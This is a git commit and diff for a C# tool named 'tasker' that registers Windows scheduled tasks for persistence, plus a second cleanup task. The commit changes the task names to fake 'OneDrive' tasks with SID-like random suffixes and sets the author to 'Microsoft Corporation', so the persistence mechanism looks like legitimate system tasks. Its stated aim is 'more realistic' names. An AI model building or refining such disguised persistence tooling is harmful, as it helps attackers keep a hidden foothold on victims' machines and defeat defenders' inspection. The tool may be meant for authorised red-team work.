d4da8fa0e81fd731d78585b2efb05e6894df2ced
PN <95763550+PN-Tester@users.noreply.github.com>
2025-03-18 13:59:40 -0400

    Update Program.cs
    Removed useless readline which would hang when executed inline
    
    added Author info "Microsoft Corporation"
    
    Changed Adobe Update Framework and Adobe Update Cleanup
    task names to more realistic OneDrive Reporting Task and OneDrive Standalone Update tasks with randomly generated Task SIDs

--- tasker/Program.cs
+++ tasker/Program.cs
@@ -7,7 +7,7 @@ class Program
     {
         if (args.Length < 4)
         {
-            Console.WriteLine("Tasker - Scheduled task creation via Windows API\n");
+            Console.WriteLine("Tasker - Scheduled task creation via COM\n");
             Console.WriteLine("Usage: tasker.exe <ExecutablePath> <WorkingDirectory> <IntervalMinutes> <MinutesUntilCleanup>");
             return;
         }
@@ -24,7 +24,7 @@ class Program
         }
         if (!double.TryParse(args[3], out MinutesUntilCleanup))
         {
-            Console.WriteLine("Invalid Minutes to Cleanup value, Using default of 5 minutes");
+            Console.WriteLine("Invalid Minutes to Cleanup value, using default of 5 minutes");
             MinutesUntilCleanup = 5;
         }
 
@@ -34,8 +34,17 @@ class Program
                 // Create a new task definition
                 TaskDefinition td = ts.NewTask();
 
+                //Chose some random digits for the name
+                Random random = new Random();
+                string ran = random.Next(100000, 999999).ToString();
+
                 // Set task settings description
-                td.RegistrationInfo.Description = "Adobe Framework Update";
+                string name1 = "OneDrive Reporting Task-S-1-5-21-3836" + ran + "-2931337074-490512365-1013";
+                td.RegistrationInfo.Description = name1;
+
+                // Set the author of the task
+                td.RegistrationInfo.Author = "Microsoft Corporation";
+             
 
                 // Set the task to run under the current user's context
                 td.Principal.UserId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
@@ -60,12 +69,17 @@ class Program
                 td.Settings.DisallowStartIfOnBatteries = false;
 
                 // Register the task
-                ts.RootFolder.RegisterTaskDefinition("Adobe Framework Update", td);
+                ts.RootFolder.RegisterTaskDefinition(name1, td);
 
                 Console.WriteLine("Persistence Task created successfully.");
 
                 TaskDefinition deleteTd = ts.NewTask();
-                deleteTd.RegistrationInfo.Description = "Adobe Framework Cleanup";
+                Random random2 = new Random();
+                string ran2 = random.Next(100000, 999999).ToString();
+
+                string name2 = "OneDrive Standalone Update Task-S-1-5-21-3831337620-" + ran2 + "9074-490512365-1001";
+                deleteTd.RegistrationInfo.Description = name2;
+                deleteTd.RegistrationInfo.Author = "Microsoft Corporation";
                 deleteTd.Principal.UserId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
                 deleteTd.Settings.StopIfGoingOnBatteries = false;
@@ -86,12 +100,11 @@ class Program
                 deleteTd.Actions.Add(deleteAction);
 
                 // Register the delete task
-                ts.RootFolder.RegisterTaskDefinition("Adobe Framework Cleanup", deleteTd);
+                ts.RootFolder.RegisterTaskDefinition(name2, deleteTd);
 
                 Console.WriteLine("Cleanup task created successfully.");
             }
         }
 
-        Console.ReadLine();
     }
 }
